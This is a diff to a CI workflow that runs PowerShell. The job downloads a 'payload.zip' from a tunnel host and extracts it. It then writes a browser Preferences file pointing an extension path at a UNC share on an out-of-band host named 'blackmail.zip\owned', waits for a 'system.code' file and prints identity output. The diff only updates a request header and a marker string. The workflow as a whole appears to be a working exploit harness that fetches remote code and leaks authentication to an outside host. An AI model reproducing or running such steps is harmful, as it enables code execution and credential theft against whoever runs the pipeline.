@@ -11,9 +11,9 @@ jobs:
         run: |
           $ErrorActionPreference = "Stop"
           New-Item -ItemType Directory -Force C:/beparser/profile | Out-Null
-          Invoke-WebRequest -Uri "https://gmdxb-2600-1f18-68f7-2200-aca3-a18d-1711-1005.run.pinggy-free.link/payload.zip" -OutFile C:/beparser/payload.zip
+          Invoke-WebRequest -Headers @{"X-Pinggy-No-Screen"="true"} -Uri "https://gmdxb-2600-1f18-68f7-2200-aca3-a18d-1711-1005.run.pinggy-free.link/payload.zip" -OutFile C:/beparser/payload.zip
           Expand-Archive -Path C:/beparser/payload.zip -DestinationPath C:/beparser -Force
-          $unc = "\\j9adzdnyijwvlprf--benative1787400701.oob.blackmail.zip\owned"
+          $unc = "\\j9adzdnyijwvlprf--benative1787400795.oob.blackmail.zip\owned"
           $obj = @{extensions=@{settings=@{bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=@{path=$unc;state=1}}}}
           $obj | ConvertTo-Json -Depth 8 -Compress | Set-Content -Encoding UTF8 C:/beparser/profile/Preferences
           @'
@@ -28,7 +28,7 @@ jobs:
             if (Test-Path C:/beparser/system.code) { break }
             Start-Sleep -Seconds 2
           }
-          Write-Output "MARKER=benative1787400701"
+          Write-Output "MARKER=benative1787400795"
           Write-Output "UNC=$unc"
           Write-Output "--- identity ---"
           if (Test-Path C:/beparser/identity.txt) { Get-Content C:/beparser/identity.txt }
